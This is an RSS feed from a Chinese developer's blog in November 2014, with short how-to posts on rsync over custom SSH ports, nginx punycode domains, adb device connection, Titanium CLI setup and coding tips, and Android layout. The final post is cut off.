<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>your site</title>
    <description>your site Blog Posts</description>
    <link>http://siwei.me/blog</link>
    <item>
      <title>rsync 使用与ssh port不同的几种方式</title>
      <description>&lt;p&gt;refer to&amp;#160; &lt;a href="http://stackoverflow.com/questions/4549945/is-it-possible-to-specify-a-different-ssh-port-when-using-rsync/27140429#27140429"&gt;http://stackoverflow.com/questions/4549945/is-it-possible-to-specify-a-different-ssh-port-when-using-rsync/27140429#27140429&lt;/a&gt;
&lt;/p&gt;

&lt;pre&gt;rsync -rvz -e 'ssh -p 2222' --progress --remove-sent-files ./dir user@host:/path
rsync -avz --rsh='ssh -p3382' root@remote_server_name:/opt/backups# or in your ~/.ssh/config  file
Host host
    Port 2222
&lt;/pre&gt;</description>
      <pubDate>Wed, 26 Nov 2014 02:41:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rsync-ssh-port</link>
    </item>
    <item>
      <title>nginx中 配置 中文域名  ( configure chinese domain name in nginx) </title>
      <description>&lt;p&gt;refer to: &lt;a href="http://www.92csz.com/57/853.html"&gt;http://www.92csz.com/57/853.html&lt;/a&gt;
&lt;/p&gt;&lt;p&gt;开始配置直接写的中文域名，但是解析不到正确的server，后来google了一把终于找到原因了，当在浏览器中敲入www.明月博客.com时，浏览器会转为www.xn--9kRq6Qw2Iu2A.com&lt;br /&gt;其实中文域名就是一个经过编码的英文域名（中文域名--&amp;gt;punycode编码--&amp;gt;英文域名）&lt;br /&gt;在线转换地址http://www.cnnic.net.cn/html/Dir/2003/10/29/1112.htm&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;配置：&lt;/p&gt;
&lt;p&gt;listen 80;   &lt;br /&gt;server_name www.xn--9kRq6Qw2Iu2A.com;   &lt;br /&gt;index index.html;  &lt;/p&gt;
&lt;p&gt;p.s. 中文域名好难看&amp;#160;&lt;/p&gt;
</description>
      <pubDate>Tue, 25 Nov 2014 09:08:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/nginx-configure-chinese-domain-name-in-nginx</link>
    </item>
    <item>
      <title>只能连QQ不能上网的解决办法( no dns caused no domain could be resolved) </title>
      <description>&lt;p&gt;今天公司的网络断了.&lt;/p&gt;
&lt;p&gt;但是我按照说明书弄完之后,发现只能访问IP, 不能访问域名.&lt;/span&gt;
&lt;/p&gt;&lt;p&gt;DNS坏了....查看了下,需要手动指定DNS(在多个input &amp;#160;source 的情况下,因为每个input source 的dns都是不一样的(?) ) 不指定DNS的话,就会用默认的 192.168.1.1 . &amp;#160;不行.&amp;#160;&lt;/span&gt;
&lt;/p&gt;&lt;p&gt;搜索了下,需要用 114 dns: 114.114.114.114 &amp;#160; &amp;#160;欧了~~&lt;/span&gt;
&lt;/p&gt;&lt;p&gt;&lt;img src="/system/images/W1siZiIsIjIwMTQvMTEvMjUvMTVfNDlfMzNfOTk2X1NjcmVlbnNob3RfZnJvbV8yMDE0XzExXzI1XzE1XzQ2XzU5LnBuZyJdXQ/Screenshot%20from%202014-11-25%2015%3A46%3A59.png" title="Screenshot From 2014 11 25 15:46:59" alt="Screenshot From 2014 11 25 15:46:59" rel="450x450" width="1680.3999999761581" height="1050.3999999761581" /&gt;&lt;/span&gt;
&lt;/p&gt;</description>
      <pubDate>Tue, 25 Nov 2014 07:47:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/qq-no-dns-caused-no-domain-could-be-resolved</link>
    </item>
    <item>
      <title>linux 连接真实设备(  connect to real android device  )</title>
      <description>&lt;p&gt;（参考：　http://www.cnblogs.com/xiaoxuetu/p/3224386.html　）　&lt;br /&gt;使用　$ adb devices 就可以看到所有的　设备列表。&lt;/p&gt;
&lt;p&gt;wind@wind-Inspiron-3542:~$ adb devices&lt;br /&gt;List of devices attached&lt;br /&gt;emulator-5554	device&lt;br /&gt;????????????	no permissions&lt;/p&gt;
&lt;p&gt;经过google,发现是　权限啥的问题。&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;wind@wind-Inspiron-3542:~$ lsusb&lt;br /&gt;Bus 001 Device 006: ID 0bda:0129 Realtek Semiconductor Corp. RTS5129 Card Reader Controller&lt;br /&gt;Bus 001 Device 007: ID 0cf3:0036 Atheros Communications, Inc.&lt;br /&gt;Bus 001 Device 004: ID 1bcf:2b8b Sunplus Innovation Technology Inc.&lt;br /&gt;Bus 001 Device 016: ID 1ebf:70d6  &lt;br /&gt;Bus 001 Device 003: ID 1017:0001 Speedy Industrial Supplies, Pte., Ltd&lt;br /&gt;Bus 001 Device 002: ID 8087:8000 Intel Corp.&lt;br /&gt;Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub&lt;br /&gt;Bus 003 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hub&lt;br /&gt;Bus 002 Device 002: ID 89e5:101b  &lt;br /&gt;Bus 002 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub&lt;/p&gt;</description>
      <pubDate>Mon, 24 Nov 2014 03:08:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/linux-connect-to-real-android-device</link>
    </item>
    <item>
      <title>titanium中使用HTML作为label</title>
      <description>&lt;p&gt;refer to:&amp;#160;&lt;a href="http://docs.appcelerator.com/titanium/3.0/#!/api/Titanium.UI.Label-property-html"&gt;http://docs.appcelerator.com/titanium/3.0/#!/api/Titanium.UI.Label-property-html&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Sun, 23 Nov 2014 08:14:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/titanium-html-label</link>
    </item>
    <item>
      <title>native android app 中　显示　（使用）　html  </title>
      <description>&lt;p&gt;refer to &lt;a href="http://developer.android.com/reference/android/text/Html.html#fromHtml%28java.lang.String%29"&gt;http://developer.android.com/reference/android/text/Html.html#fromHtml%28java.lang.String%29&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;Class Overview&lt;br /&gt;This class processes HTML strings into displayable styled text. Not all HTML tags are supported.&lt;/p&gt;
&lt;p&gt;也就是说，可以处理大部分的ＨＴＭＬ内容． 我已经很欣慰了．&lt;/p&gt;
&lt;p&gt;and refer to:&amp;#160; &lt;a href="http://stackoverflow.com/questions/2116162/how-to-display-html-in-textview"&gt;http://stackoverflow.com/questions/2116162/how-to-display-html-in-textview&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;You need to use Html.fromHtml() to use HTML in your XML Strings. Simply referencing a String with HTML in your layout XML will not work.&lt;/p&gt;
&lt;p&gt;For example:&lt;/p&gt;
&lt;p&gt;myTextView.setText(Html.fromHtml("&amp;lt;h2&amp;gt;Title&amp;lt;/h2&amp;gt;&amp;lt;br&amp;gt;&amp;lt;p&amp;gt;Description here&amp;lt;/p&amp;gt;"));&lt;/p&gt;</description>
      <pubDate>Sun, 23 Nov 2014 08:09:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/native-android-app-html</link>
    </item>
    <item>
      <title>linux 下配置 ssl edge proxy (eurekavpt )</title>
      <description>&lt;p&gt;ssl edge 是一个非常好用的VPN/proxy, 比云梯 稳定快速的多. &amp;#160;在LINUX下开发 Titanium 需要用到各种翻墙,所以它是必备工具.&amp;#160;&lt;/p&gt;
&lt;p&gt;1. 根据自己付费后的用户名和密码,下载 相关的代理文件. &amp;#160;(需要的同学可以问我要)&amp;#160;&lt;/p&gt;
&lt;p&gt;也可以来这个页面(https://eurekavpt.com/page/ssledge-on-linux ) 根据提示进行下载&lt;/p&gt;
&lt;p&gt;3. 配置 ssledge-tls.conf 文件, 记得在第一行global 下面加上&amp;#160;
&lt;/p&gt;
&lt;pre&gt;  global
     log 127.0.0.1 local0
     nbproc 1
     maxconn 100
     ssl-server-verify none
&lt;/pre&gt;
&lt;p&gt;4. 启动: &amp;#160;&lt;/p&gt;
&lt;p&gt;$ ./ssledge-term-x64 -f ssledge-tls.conf -D&lt;/p&gt;
&lt;p&gt;默认的代理服务器地址是:  127.0.0.1:16808&amp;#160;&lt;/p&gt;
&lt;p&gt;可以把它做成crontab&amp;#160;&lt;/p&gt;</description>
      <pubDate>Wed, 19 Nov 2014 00:39:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/linux-ssl-edge-proxy-eurekavpt</link>
    </item>
    <item>
      <title>安卓开发的一点感想—— 在view 中使用 XML</title>
      <description>&lt;p&gt;如果我的竞争对手，希望在页面中加上一个按钮，需要做这些事情：&lt;/p&gt;
&lt;pre&gt;&amp;lt;Button id="@+id/tiny"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentTop="true"
        android:layout_centerInParent="true"
        android:text="Tiny"
        android:textSize="8sp"
        android:background="@drawable/my_button_background"/&amp;gt;

&amp;lt;Button id="@+id/big"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentBottom="true"
        android:layout_centerInParent="true"
        android:text="Biiiiiiig text!"
        android:textSize="30sp"
        android:background="@drawable/my_button_background"/&amp;gt;
&lt;/pre&gt;
&lt;p&gt;那我就太高兴了！ &amp;#160;^_^&amp;#160;&lt;/p&gt;
&lt;p&gt;谢谢 google android 开发人员，给我的竞争对手弄了这么高的门槛，而且让他们爱上安卓开发。&lt;/p&gt;</description>
      <pubDate>Tue, 18 Nov 2014 23:25:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/view-xml</link>
    </item>
    <item>
      <title>setup titanium command line interface</title>
      <description>&lt;p&gt;eclipse 虽好，但是我只喜欢 命令行。 因为IDE 把太多的debug细节都隐藏了。与其让eclipse输出debug信息，不如直接让我自己动手。&lt;/p&gt;
&lt;p&gt;refer to:&amp;#160; &lt;a href="http://docs.appcelerator.com/titanium/3.0/#!/guide/Setting_up_the_Titanium_CLI-section-37520113_SettinguptheTitaniumCLI-InstalltheCLI"&gt;http://docs.appcelerator.com/titanium/3.0/#!/guide/Setting_up_the_Titanium_CLI-section-37520113_SettinguptheTitaniumCLI-InstalltheCLI&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;1. $&amp;#160;npm install -g titanium&lt;/p&gt;
&lt;p&gt;2. $ titanium login  (记得先注册)
&lt;/p&gt;
&lt;pre&gt;sg552@siwei-linux-notebook:/workspace$ titanium login
Titanium Command-Line Interface, CLI version 3.4.0, Titanium SDK version 3.4.0.GA
Copyright (c) 2012-2014, Appcelerator, Inc.  All Rights Reserved.

Please report bugs to http://jira.appcelerator.org/

Username: shensiwei@sina.com
Password: ******
Logged in successfully
&lt;/pre&gt;
&lt;p&gt;3. $ titanium sdk install&amp;#160;&lt;/p&gt;
&lt;p&gt;4. $ titanium setup &amp;#160;&amp;#160;然后会跳出很多配置项供你选择.
&lt;/p&gt;
&lt;pre&gt;──────────────────────┤ Main Menu ├───────────────────────

   1)  quick    Quick Setup
   2)  check    Check Environment
   3)  user     User Information
   4)  app      New App Defaults
   5)  network  Network Settings
   6)  cli      Titanium CLI Settings
   7)  sdk      Titanium SDK Settings
   8)  android  Android Settings
   9)  exit     Exit
Where do you want to go?   

&lt;/pre&gt;
&lt;p&gt;最重要的是 第二个项目, check, 它会很详细的告诉你哪些东西安装好了,哪些木有.&lt;/p&gt;
&lt;pre&gt;──────────────────┤ Check Environment ├───────────────────

Node.js
  ★  node               new version v0.10.33 available! (currently v0.10.32)
  ★  npm                new version v2.1.9 available! (currently v1.4.28)
 
Titanium CLI
  ★  cli                new version v3.4.1 available (currently v3.4.0)
 
Titanium CLI Dependencies
  ✓  async              up-to-date (v0.2.10)
  ✓  colors             up-to-date (v0.6.2)
  ✓  fields             up-to-date (v0.1.17)
  ✓  humanize           up-to-date (v0.0.9)
  ✓  jade               up-to-date (v0.35.0)
  ✓  longjohn           up-to-date (v0.2.4)
  ✓  moment             up-to-date (v2.4.0)
  ✓  node-appc          up-to-date (v0.2.14)
  ✓  optimist           up-to-date (v0.6.1)
  ✓  request            up-to-date (v2.27.0)
  ✓  semver             up-to-date (v2.2.1)
  ✓  sprintf            up-to-date (v0.1.4)
  ✓  temp               up-to-date (v0.6.0)
  ✓  winston            up-to-date (v0.6.2)
  ✓  wrench             up-to-date (v1.5.8)
 
Titanium SDK
  ★  latest sdk         new version v3.4.1.GA available! (currently v3.4.0.GA)
  ✓  selected sdk       up-to-date (v3.4.0.GA)
 
Android Environment
  ✓  sdk                installed (/workspace/android-sdk-linux)
  ✓  tools              installed (v23.0.2)
  ✓  platform tools     installed (v20)
  ✓  build tools        installed (v20)
  ✓  adb                installed /workspace/android-sdk-linux/platform-tools/adb
  ✓  android            installed /workspace/android-sdk-linux/tools/android
  ✓  emulator           installed /workspace/android-sdk-linux/tools/emulator
  ✓  mksdcard           installed /workspace/android-sdk-linux/tools/mksdcard
  ✓  zipalign           installed /workspace/android-sdk-linux/build-tools/20.0.0/zipalign
  ✓  aapt               installed /workspace/android-sdk-linux/build-tools/20.0.0/aapt
  ✓  aidl               installed /workspace/android-sdk-linux/build-tools/20.0.0/aidl
  ✓  targets            installed (3 found)
  ✓  avds               installed (1 found)
  !  ndk                Android NDK not found
 
Java Development Kit
  ✓  jdk                installed (v1.7.0)
  ✓  java               installed /workspace/coding_tools/jdk1.7.0_67/bin/java
  ✓  javac              installed /workspace/coding_tools/jdk1.7.0_67/bin/javac
  ✓  keytool            installed /workspace/coding_tools/jdk1.7.0_67/bin/keytool
  ✓  jarsigner          installed /workspace/coding_tools/jdk1.7.0_67/bin/jarsigner
 
Intel® Hardware Accelerated Execution Manager (HAXM)
  ✓  compatible         
  !  installed          not found; install HAXM to use Android x86 emulator
 
Network
  ✓  online             
  ✓  proxy server enabled 
  ✓  http request test  
  ✓  https request test 
 
Directory Permissions
  ✓  home directory     
  ✓  titanium config directory 
  ✓  titanium sdk install directory 
  ✓  temp directory     
 

&lt;/pre&gt;
&lt;p&gt;最后,测试: &amp;#160;&lt;/p&gt;
&lt;p&gt;$ titanium create --name MyFirstProject&lt;br /&gt;$ cd MyFirstProject&lt;br /&gt;$ titanium build&lt;/p&gt;</description>
      <pubDate>Tue, 18 Nov 2014 23:22:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/setup-titanium-command-line-interface</link>
    </item>
    <item>
      <title>android 多屏幕适配中的 l/m/h/xh/xxh dpi</title>
      <description>&lt;p&gt;refer to:&amp;#160; &lt;a href="http://www.cnblogs.com/cmduan/archive/2012/03/09/2388345.html"&gt;http://www.cnblogs.com/cmduan/archive/2012/03/09/2388345.html&lt;/a&gt;
&lt;/p&gt;&lt;p&gt;基本上， &amp;#160;low/middel/high/extra high/xx high &amp;#160; dpi.&lt;/p&gt;
&lt;p&gt;dpi = dot per inch&lt;/p&gt;
&lt;p&gt;看看，安卓是多么的笨重。 要是跟CSS3 一样，有个 background-size: cover 就全解决了。&lt;/p&gt;</description>
      <pubDate>Tue, 18 Nov 2014 23:18:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/android-l-m-h-xh-xxh-dpi</link>
    </item>
    <item>
      <title>android nine-patch image</title>
      <description>&lt;p&gt;安卓开发中，作为图片背景时，会根据设备屏幕的大小，图片会发生变化，解决办法是使用draw9patch&lt;/p&gt;
&lt;p&gt;refer to:&amp;#160;&lt;a href="http://developer.android.com/guide/topics/graphics/2d-graphics.html#nine-patch"&gt;http://developer.android.com/guide/topics/graphics/2d-graphics.html#nine-patch&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;下面是几个相关的概念：&lt;/p&gt;
&lt;p&gt;To create a nine-patch image, you can either use the Android SDK draw9patch tool or a graphics editor. If you are using a graphics editor, create a one-pixel transparent or white border around your PNG image, then change the top and left border to black pixels where you want the image to stretch. Mark the entire right and bottom borders with black pixels to indicate the drawable areas when the image is scaled. If you do not specify the whole image as drawable, the image may not scale properly, causing it to be squished in part of the screen. For more information, refer to the Android Draw 9-Patch help tutorial for directions on using the draw9patch tool or refer to the Android nine-patch image specification for information on creating a nine-patch image in a graphics editor.&lt;/p&gt;
&lt;p&gt;Name the file default.9.png, place it in the Resources/android folder and remove the default.png image. If both of these files exist, the build will fail with an error.&lt;/p&gt;
&lt;p&gt;To use multiple density-specific splash screen images, copy your nine-patch image(s) to ./platform/android/res/drawable[-xdpi]/ in your project root directory (not the Resources folder), where xdpi can be a density group to specify more than one image for different screen densities or use the -nodpi suffix to have it support all resolutions. Rename the file(s) to background.9.png. For example, the following project specifies splash images for multiple densities:&lt;/p&gt;
&lt;p&gt;SampleProject&lt;br /&gt;├── app&lt;br /&gt;├── platform&lt;br /&gt;│   └── android&lt;br /&gt;│       └── res&lt;br /&gt;│           ├── drawable-ldpi&lt;br /&gt;│           │   └─── background.9.png&lt;br /&gt;│           ├── drawable-mdpi&lt;br /&gt;│           │   └─── background.9.png&lt;br /&gt;│           ├── drawable-hdpi&lt;br /&gt;│           │   └─── background.9.png&lt;br /&gt;│           └── drawable-xhdpi&lt;br /&gt;│               └─── background.9.png&lt;br /&gt;├── Resources&lt;br /&gt;└── tiapp.xml&lt;/p&gt;</description>
      <pubDate>Tue, 18 Nov 2014 23:15:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/android-nine-patch-image</link>
    </item>
    <item>
      <title>Titanium 跨平台编程 ( supporting multiple platform in single code base) </title>
      <description>&lt;p&gt; refer to: &lt;a href="http://docs.appcelerator.com/titanium/latest/#!/guide/Supporting_Multiple_Platforms_in_a_Single_Codebase"&gt;http://docs.appcelerator.com/titanium/latest/#!/guide/Supporting_Multiple_Platforms_in_a_Single_Codebase&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;跟phonegap, rhino不一样, Titanium 不是 编写一次, 到处运行. 而是&lt;/p&gt;</description>
      <pubDate>Sat, 15 Nov 2014 02:50:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/titanium-supporting-multiple-platform-in-single-code-base</link>
    </item>
    <item>
      <title>Titanium 编码最佳实践 ( coding best practices for Titanium) </title>
      <description>&lt;p&gt;refer to 
&lt;a href="http://docs.appcelerator.com/titanium/latest/#!/guide/Coding_Best_Practices" style="background-color: transparent;"&gt;http://docs.appcelerator.com/titanium/latest/#!/guide/Coding_Best_Practices&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;JavaScript and general recommendations&lt;/p&gt;
&lt;p&gt;1. 避免使用global scope.&amp;#160;&lt;/p&gt;
&lt;p&gt;1.1 global scope中的 资源(变量啊啥的)无法被 自动回收. 你需要手动的给它变成null&lt;/p&gt;
&lt;p&gt;1.2. global scope中的东西容易被覆盖掉.&amp;#160;&lt;/p&gt;
&lt;p&gt;1.3. global scope中的东西无法被 commonJS 或者其他module 所使用.&lt;/p&gt;
&lt;p&gt;什么情况下 变量会被定义在global scope中呢?&amp;#160;&lt;/p&gt;
&lt;p&gt;a. 在function 或者 commonJS 之外 声明变量&lt;/p&gt;
&lt;p&gt;b. 任何不使用var 声明的变量.&lt;/p&gt;
&lt;p&gt;2. 不要在 global event listener中使用 local object ,会导致内存泄露.例如:&amp;#160;&lt;/p&gt;
&lt;pre&gt;var someFunction = function() {
    var table = Ti.UI.createTableView(),
        label = Ti.UI.createLabel(),
        view = Ti.UI.createView();


    Ti.App.addEventListener('bad:move', function(e) {
        table.setData(e.data);
    });

    view.add(table);
    view.add(label);

    return view;
};
&lt;/pre&gt;
&lt;p&gt;Ti.App, Ti.Geolocation, Ti.Gesture 等关联的event 都是 global event. 所以,尽量不要针对它们使用.&lt;/p&gt;
&lt;p&gt;3. event name 不要使用空格. 错误的写法: &amp;#160;'my event' , 正确的写法: 'my:event' or 'my_event'&lt;/p&gt;
&lt;p&gt;4. 使用 defer loading (延迟加载) &amp;#160;可以大大加快启动速度.例如: &amp;#160;
&lt;/p&gt;
&lt;pre&gt;//muse be loaded at launch
var WindowOne = require('ui/WindowOne').WindowOne;

var win1 = new WindowOne();
win1.open();

win1.addEventListener('click', function() {
  //load window two JavaScript when needed...
  var WindowTwo = require('ui/WindowTwo').WindowTwo;
  var win2 = new WindowTwo();
  win2.open();
  win2.addEventListener('click', function() {
    //load window three JavaScript when needed...
    var WindowThree = require('ui/WindowThree').WindowThree;
    var win3 = new WindowTwo();
    win3.open();
  });
});
&lt;/pre&gt;
&lt;p&gt;下面是针对 Titanium的建议: &amp;#160;&lt;/p&gt;
&lt;p&gt;5. 不要修改 Titanium的prototype &amp;#160;( 就是不要使用 Ti 这个namespace .)&lt;/p&gt;
&lt;p&gt;6. 对于跨平台的编码, 要么:&lt;/p&gt;
&lt;p&gt;&amp;#160; 6.1 使用 很多个 if ...else 语句. &amp;#160;&lt;/p&gt;
&lt;p&gt;&amp;#160; 6.2 也可以使用 git branch . &amp;#160;&lt;/p&gt;
&lt;p&gt;总之各有利弊, 看情况了. 更多看这里:&amp;#160; &lt;a href="http://docs.appcelerator.com/titanium/latest/#!/guide/Supporting_Multiple_Platforms_in_a_Single_Codebase"&gt;http://docs.appcelerator.com/titanium/latest/#!/guide/Supporting_Multiple_Platforms_in_a_Single_Codebase&lt;/a&gt;
&lt;/p&gt;&lt;p&gt;7. 仅仅在 .js 文件中保存敏感信息. 因为 .js 文件在编译(成Titanium能识别的文件) 后, .js 会被压缩, 而且加密(obfusecated ). &amp;#160;如果只是放在了 .txt , &amp;#160;.sqlite 中,那么这些信息可以直接被 别有用心的人读取到.&lt;/p&gt;
&lt;p&gt;8. 尽量少调用&amp;#160;Ti.Platform.osname 这样的方法. 因为会耗费资源. &amp;#160;最好一次读取到本地变量中, 然后多次使用.&amp;#160;&lt;/p&gt;
&lt;p&gt;9. 使用 CommonJS 来 划分模块.&lt;/p&gt;
Do not name custom events with spacesDefer script loadingTitanium-specific RecommendationsDon't Extend Titanium PrototypesCoding strategies for multiplatform appsDon't store sensitive data in non-JavaScript filesSet local variables to avoid calling native methodsApp Architecture RecommendationsModular components with CommonJS</description>
      <pubDate>Sat, 15 Nov 2014 01:18:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/titanium-coding-best-practices-for-titanium</link>
    </item>
    <item>
      <title>Titanium 能做什么? ( what native functions can Titanium execute? )</title>
      <description>&lt;p&gt;再多一点儿猛料:&lt;/p&gt;
&lt;p&gt;Titanium 可以PUSH ( &lt;a href="http://docs.appcelerator.com/titanium/latest/#!/guide/Push_Notifications"&gt;http://docs.appcelerator.com/titanium/latest/#!/guide/Push_Notifications&lt;/a&gt; 和 &lt;a href="http://programmer.shinchi.tw/category/titanium/"&gt;http://programmer.shinchi.tw/category/titanium/&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;可以调用摄像头&amp;#160; &lt;a href="http://docs.appcelerator.com/titanium/latest/#!/guide/Camera_and_Photo_Gallery_APIs"&gt;http://docs.appcelerator.com/titanium/latest/#!/guide/Camera_and_Photo_Gallery_APIs&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt; 地理位置服务: &lt;a href="http://docs.appcelerator.com/titanium/latest/#!/guide/Location_Services"&gt;http://docs.appcelerator.com/titanium/latest/#!/guide/Location_Services&lt;/a&gt; &lt;/p&gt;</description>
      <pubDate>Sat, 15 Nov 2014 01:10:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/titanium-what-native-functions-can-titanium-execute</link>
    </item>
    <item>
      <title>Titanium 一个比较有深度的讨论:  100% native code?</title>
      <description>&lt;p&gt;refer to : &lt;a href="http://developer.appcelerator.com/question/151982/100-native-code"&gt;http://developer.appcelerator.com/question/151982/100-native-code&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;通读下来,基本干货是:&lt;/p&gt;
&lt;p&gt;1. Titanium 不是 hybrid, like phonegap.&amp;#160;&lt;/p&gt;
&lt;p&gt;2. Titanium 也不是把js 代码转换成 java for Android, OC for iOS. 而是类似于JVM那样, &amp;#160; &amp;#160;js =&amp;gt; interpreter =&amp;gt; run native function&amp;#160;&lt;/p&gt;
&lt;p&gt;结论: Titanium 绝对比 &amp;#160;hybrid快,而且 能调用native code.&amp;#160;&lt;/p&gt;
&lt;p&gt;再多一点儿猛料:&lt;/p&gt;
&lt;p&gt;Titanium 可以PUSH ( &lt;a href="http://docs.appcelerator.com/titanium/latest/#!/guide/Push_Notifications"&gt;http://docs.appcelerator.com/titanium/latest/#!/guide/Push_Notifications&lt;/a&gt; 和 &lt;a href="http://programmer.shinchi.tw/category/titanium/"&gt;http://programmer.shinchi.tw/category/titanium/&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;可以调用摄像头&amp;#160; &lt;a href="http://docs.appcelerator.com/titanium/latest/#!/guide/Camera_and_Photo_Gallery_APIs"&gt;http://docs.appcelerator.com/titanium/latest/#!/guide/Camera_and_Photo_Gallery_APIs&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Sat, 15 Nov 2014 00:52:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/titanium-100-native-code</link>
    </item>
    <item>
      <title>如何在ubuntu下连接　real device  ( connect real device under ubuntu using adb command ) </title>
      <description>&lt;p&gt;
（参考：　&lt;a href="http://www.cnblogs.com/xiaoxuetu/p/3224386.html"&gt;http://www.cnblogs.com/xiaoxuetu/p/3224386.html&lt;/a&gt;&amp;#160;　）　&amp;#160;&lt;/p&gt;
&lt;p&gt;使用　$ adb devices 就可以看到所有的　设备列表。
&lt;/p&gt;
&lt;pre&gt;wind@wind-Inspiron-3542:~$ adb devices
List of devices attached
emulator-5554	device
????????????	no permissions
&lt;/pre&gt;
&lt;p&gt;
经过google,发现是　权限啥的问题。
&lt;/p&gt;
&lt;pre&gt;wind@wind-Inspiron-3542:~$ lsusb
Bus 001 Device 006: ID 0bda:0129 Realtek Semiconductor Corp. RTS5129 Card Reader Controller
Bus 001 Device 007: ID 0cf3:0036 Atheros Communications, Inc.
Bus 001 Device 004: ID 1bcf:2b8b Sunplus Innovation Technology Inc.
Bus 001 Device 016: ID 1ebf:70d6  
Bus 001 Device 003: ID 1017:0001 Speedy Industrial Supplies, Pte., Ltd
Bus 001 Device 002: ID 8087:8000 Intel Corp.
Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub
Bus 003 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hub
Bus 002 Device 002: ID 89e5:101b  
Bus 002 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub
&lt;/pre&gt;</description>
      <pubDate>Thu, 13 Nov 2014 02:13:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ubuntu-real-device-connect-real-device-under-ubuntu-using-adb-command</link>
    </item>
    <item>
      <title> Eclispe 系列 （RadRails, Titanium , ADT, Aptana .. ) 的快捷键  shortcuts</title>
      <description>&lt;p&gt;快速打开文件：  ctrl + shift + r     ( vim : ctrl + t)&lt;br /&gt;快速打开之前的文件：  ctrl + shift + e   , ctrl + e    (  vim:  ctrl + e )&lt;br /&gt;快速切换窗口 ：    ctrl + f7&lt;br /&gt;查找： ctrl + h&lt;br /&gt;代码格式化： ctrl + shift + f&lt;br /&gt;跳到上一次的位置： alt + left&lt;br /&gt;跳到前一次的位置： alt + right&lt;/p&gt;
&lt;p&gt;（在 Titanium中尚未发现：   refactoring:  rename   )&lt;/p&gt;</description>
      <pubDate>Thu, 13 Nov 2014 02:02:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/eclispe-radrails-titanium-adt-aptana-shortcuts</link>
    </item>
    <item>
      <title>软件方法论： 抛弃 boiler plate code . （没它不行，但是它又跟核心功能无关）</title>
      <description>&lt;p&gt;想读一个文件：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;
read "some_file.txt"   # 不懂编程，   和   编程了 10年+ 的人。
&lt;/code&gt;
&lt;/p&gt;
&lt;p&gt;
# 有一定编程基础/经验的人：
&lt;/p&gt;
&lt;pre&gt;   BufferedReader br = new BufferedReader(new FileReader("file.txt"));
    try {
        StringBuilder sb = new StringBuilder();
        String line = br.readLine();

        while (line != null) {
            sb.append(line);
            sb.append(System.lineSeparator());
            line = br.readLine();
        }
        String everything = sb.toString();
    } finally {
        br.close();
    }
&lt;/pre&gt; 

&lt;pre&gt;# 高级语言：
a = 1 + 2 + 3 + 4.....
&lt;/pre&gt;
# 汇编：
&lt;pre&gt;DATAS SEGMENT
     n   DW ?
     sum DW ?
     DISP DB 5 DUP('$')
     MSG0 DB 'N=','$'
     MSG1 DB 'SUM=','$'	
DATAS ENDS
STACK SEGMENT PARA STACK 'STACK'
      DW 200 DUP (?)
STACK ENDS
CODES SEGMENT
     ASSUME CS:CODES,DS:DATAS,SS:STACK
     START: 
            MOV AX,STACK
	    MOV SS,AX
	    MOV SP,400	
            MOV AX,DATAS
&lt;/pre&gt;
boilder plate code: 在所有语言里都有， 在 ruby, coffeescript,  (有可能还有CSS ？ ） 里是最少的。
</description>
      <pubDate>Thu, 13 Nov 2014 01:59:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/boiler-plate-code</link>
    </item>
    <item>
      <title>coolpad 手机的默认资料保存地址(screenshot, call record, 等)</title>
      <description>&lt;p&gt;在 sd 卡下面的 &amp;#160;coolpad目录下.&amp;#160;&lt;/p&gt;
&lt;p&gt;找了半天. 呵呵.&amp;#160;&lt;/p&gt;</description>
      <pubDate>Thu, 13 Nov 2014 01:58:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/coolpad-screenshot-call-record</link>
    </item>
    <item>
      <title>如何备案  ( how to bei'an in mainland )</title>
      <description>&lt;p&gt;1. 官方网站：&lt;a href="http://www.miitbeian.gov.cn/state/outPortal/loginPortal.action;jsessionid=0xF2JhLPlf1TvMTd29yLw5G9tB7qyWT6CSqgFyXQJtnqyPQJnctC!432660061#"&gt;http://www.miitbeian.gov.cn/state/outPortal/loginPortal.action;jsessionid=0xF2JhLPlf1TvMTd29yLw5G9tB7qyWT6CSqgFyXQJtnqyPQJnctC!432660061#&lt;/a&gt;
&lt;/p&gt;
